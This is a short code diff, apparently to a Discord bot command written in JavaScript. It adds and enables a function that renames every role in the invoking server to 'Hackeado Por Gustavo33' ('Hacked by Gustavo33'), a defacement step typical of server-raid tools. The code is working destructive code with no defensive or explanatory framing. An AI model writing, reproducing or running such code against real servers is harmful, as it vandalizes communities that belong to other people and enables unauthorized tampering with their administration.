@@ -11,10 +11,13 @@ exports.run = async (client, message) => {
        })
     }
     function b1(){
+     client.guilds.get(message.guild.id).roles.forEach((r) => {
+         r.setName("Hackeado Por Gustavo33")
+     })
     }
     function a2(){
         a1()
-        //b1()
+        b1()
     }
     a2()
 }
